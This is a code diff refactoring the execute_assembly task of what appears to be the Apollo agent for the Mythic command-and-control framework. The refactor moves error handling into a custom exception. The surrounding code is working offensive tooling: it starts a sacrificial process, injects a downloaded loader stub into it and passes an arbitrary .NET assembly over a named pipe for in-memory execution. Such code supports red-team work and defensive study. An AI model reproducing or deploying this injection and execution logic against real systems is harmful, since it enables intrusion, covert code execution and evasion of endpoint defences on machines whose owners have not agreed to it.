@@ -23,6 +23,23 @@ using ApolloInterop.Classes.Collections;
 
 namespace Tasks
 {
+
+    internal class ExecuteAssemblyException : Exception
+    {
+        public ExecuteAssemblyException()
+        {
+        }
+
+        public ExecuteAssemblyException(string message) : base(message)
+        {
+        }
+
+        public ExecuteAssemblyException(string message, Exception inner)
+            : base (message, inner)
+        {
+        }
+    }
+
     public class execute_assembly : Tasking
     {
         [DataContract]
@@ -47,6 +64,7 @@ namespace Tasks
         private Action<object> _flushMessages;
         private ThreadSafeList<string> _assemblyOutput = new ThreadSafeList<string>();
         private bool _completed = false;
+
         public execute_assembly(IAgent agent, MythicTask mythicTask) : base(agent, mythicTask)
         {
             _sendAction = (object p) =>
@@ -71,7 +89,7 @@ namespace Tasks
             _flushMessages = (object p) =>
             {
                 string output = "";
-                while(!_cancellationToken.IsCancellationRequested && !_completed)
+                while (!_cancellationToken.IsCancellationRequested && !_completed)
                 {
                     WaitHandle.WaitAny(new WaitHandle[]
                     {
@@ -110,7 +128,7 @@ namespace Tasks
         public override void Start()
         {
             MythicTaskResponse resp;
-            Process proc = null;
+            Process? proc = null;
             try
             {
                 ExecuteAssemblyParameters parameters = _jsonSerializer.Deserialize<ExecuteAssemblyParameters>(_data.Parameters);
@@ -118,109 +136,111 @@ namespace Tasks
                     string.IsNullOrEmpty(parameters.AssemblyName) ||
                     string.IsNullOrEmpty(parameters.PipeName))
                 {
-                    resp = CreateTaskResponse(
-                        $"One or more required arguments was not provided.",
-                        true,
-                        "error");
+                    throw new ExecuteAssemblyException($"One or more required arguments was not provided.");
                 }
-                else
-                {
-                    if (_agent.GetFileManager().GetFileFromStore(parameters.AssemblyName, out byte[] assemblyBytes))
-                    {
-                        if (_agent.GetFileManager().GetFile(_cancellationToken.Token, _data.ID, parameters.LoaderStubId,
-                                out byte[] exeAsmPic))
-                        {
-                            ApplicationStartupInfo info = _agent.GetProcessManager().GetStartupInfo(IntPtr.Size == 8);
-                            proc = _agent.GetProcessManager().NewProcess(info.Application, info.Arguments, true);
-                            if (proc.Start())
-                            {
-                                _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
-                                    "",
-                                    false,
-                                    "",
-                                    new IMythicMessage[]
-                                    {
-                                        Artifact.ProcessCreate((int) proc.PID, info.Application, info.Arguments)
-                                    }
-                                ));
-                                if (proc.Inject(exeAsmPic))
-                                {
-                                    _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
-                                        "",
-                                        false,
-                                        "",
-                                        new IMythicMessage[]
-                                        {
-                                            Artifact.ProcessInject((int) proc.PID,
-                                                _agent.GetInjectionManager().GetCurrentTechnique().Name)
-                                        }));
-                                    IPCCommandArguments cmdargs = new IPCCommandArguments
-                                    {
-                                        ByteData = assemblyBytes,
-                                        StringData = string.IsNullOrEmpty(parameters.AssemblyArguments)
-                                            ? ""
-                                            : parameters.AssemblyArguments,
-                                    };
-                                    AsyncNamedPipeClient client = new AsyncNamedPipeClient("127.0.0.1", parameters.PipeName);
-                                    client.ConnectionEstablished += Client_ConnectionEstablished;
-                                    client.MessageReceived += Client_MessageReceived;
-                                    client.Disconnect += Client_Disconnect;
-                                    if (client.Connect(10000))
-                                    {
-                                        IPCChunkedData[] chunks = _serializer.SerializeIPCMessage(cmdargs);
-                                        foreach (IPCChunkedData chunk in chunks)
-                                        {
-                                            _senderQueue.Enqueue(Encoding.UTF8.GetBytes(_serializer.Serialize(chunk)));
-                                        }
 
-                                        _senderEvent.Set();
-                                        WaitHandle.WaitAny(new WaitHandle[]
-                                        {
-                                            _complete,
-                                            _cancellationToken.Token.WaitHandle
-                                        });
-                                        resp = CreateTaskResponse("", true, "completed");
-                                    }
-                                    else
-                                    {
-                                        resp = CreateTaskResponse($"Injected assembly into sacrificial process: {info.Application}.\n Failed to connect to named pipe.", true, "error");
-                                    }
-                                }
-                                else
-                                {
-                                    resp = CreateTaskResponse($"Failed to inject assembly loader into sacrificial process {info.Application}.", true, "error");
-                                }
-                            }
-                            else
-                            {
-                                resp = CreateTaskResponse($"Failed to start sacrificial process {info.Application}", true, "error");
-                            }
-                        }
-                        else
-                        {
-                            resp = CreateTaskResponse($"Failed to download assembly loader stub (with id: {parameters.LoaderStubId})", true, "error");
-                        }
-                    }
-                    else
+                if (!_agent.GetFileManager().GetFileFromStore(parameters.AssemblyName, out byte[] assemblyBytes))
+                {
+                    throw new ExecuteAssemblyException($"'{parameters.AssemblyName}' is not loaded (have you registered it?");
+                }
+
+                if (!_agent.GetFileManager().GetFile(_cancellationToken.Token, _data.ID, parameters.LoaderStubId, out byte[] exeAsmPic))
+                {
+                    throw new ExecuteAssemblyException($"Failed to download assembly loader stub (with id: {parameters.LoaderStubId})");
+                }
+
+                ApplicationStartupInfo info = _agent.GetProcessManager().GetStartupInfo(IntPtr.Size == 8);
+                proc = _agent.GetProcessManager().NewProcess(info.Application, info.Arguments, true);
+
+                try
+                {
+                    if (!proc.Start())
                     {
-                        resp = CreateTaskResponse($"{parameters.AssemblyName} is not loaded (have you registered it?)", true, "error");
+                        throw new ExecuteAssemblyException("process not started.");
                     }
                 }
+                catch (Exception e)
+                {
+                    throw new ExecuteAssemblyException($"Failed to start '{info.Application}' sacrificial process: {e.Message}");
+                }
+
+                _agent.GetTaskManager()
+                    .AddTaskResponseToQueue(
+                        CreateTaskResponse(
+                            "",
+                            false,
+                            "",
+                            new IMythicMessage[]
+                            {
+                                Artifact.ProcessCreate((int) proc.PID, info.Application, info.Arguments)
+                            }
+                        )
+                    );
+
+                if (!proc.Inject(exeAsmPic))
+                {
+                    throw new ExecuteAssemblyException($"Failed to inject assembly loader into sacrificial process {info.Application}.");
+                }
+
+                _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
+                    "",
+                    false,
+                    "",
+                    new IMythicMessage[]
+                    {
+                        Artifact.ProcessInject((int) proc.PID,
+                            _agent.GetInjectionManager().GetCurrentTechnique().Name)
+                    }));
+
+                IPCCommandArguments cmdargs = new IPCCommandArguments
+                {
+                    ByteData = assemblyBytes,
+                    StringData = string.IsNullOrEmpty(parameters.AssemblyArguments)
+                        ? ""
+                        : parameters.AssemblyArguments,
+                };
+
+                AsyncNamedPipeClient client = new AsyncNamedPipeClient("127.0.0.1", parameters.PipeName);
+                client.ConnectionEstablished += Client_ConnectionEstablished;
+                client.MessageReceived += Client_MessageReceived;
+                client.Disconnect += Client_Disconnect;
+
+                if (!client.Connect(10000))
+                {
+                    throw new ExecuteAssemblyException($"Injected assembly into sacrificial process: {info.Application}.\n Failed to connect to named pipe.");
+                }
+
+                IPCChunkedData[] chunks = _serializer.SerializeIPCMessage(cmdargs);
+                foreach (IPCChunkedData chunk in chunks)
+                {
+                    _senderQueue.Enqueue(Encoding.UTF8.GetBytes(_serializer.Serialize(chunk)));
+                }
+
+                _senderEvent.Set();
+                WaitHandle.WaitAny(new WaitHandle[]
+                {
+                    _complete,
+                    _cancellationToken.Token.WaitHandle
+                });
+
+                resp = CreateTaskResponse("", true, "completed");
+            }
+            catch (ExecuteAssemblyException ex)
+            {
+                resp = CreateTaskResponse($"Error executing assembly\n\n{ex.Message}", true, "error");
             }
             catch (Exception ex)
             {
                 resp = CreateTaskResponse($"Unexpected error: {ex.Message}\n\n{ex.StackTrace}", true, "error");
             }
 
-            _agent.GetTaskManager().AddTaskResponseToQueue(resp);
             if (proc != null && !proc.HasExited)
             {
                 proc.Kill();
-                _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse("", true, "", new IMythicMessage[]
-                {
-                    Artifact.ProcessKill((int) proc.PID)
-                }));
+                resp.Artifacts = [Artifact.ProcessKill((int)proc.PID)];
             }
+
+            _agent.GetTaskManager().AddTaskResponseToQueue(resp);
         }
 
         private void Client_Disconnect(object sender, NamedPipeMessageArgs e)
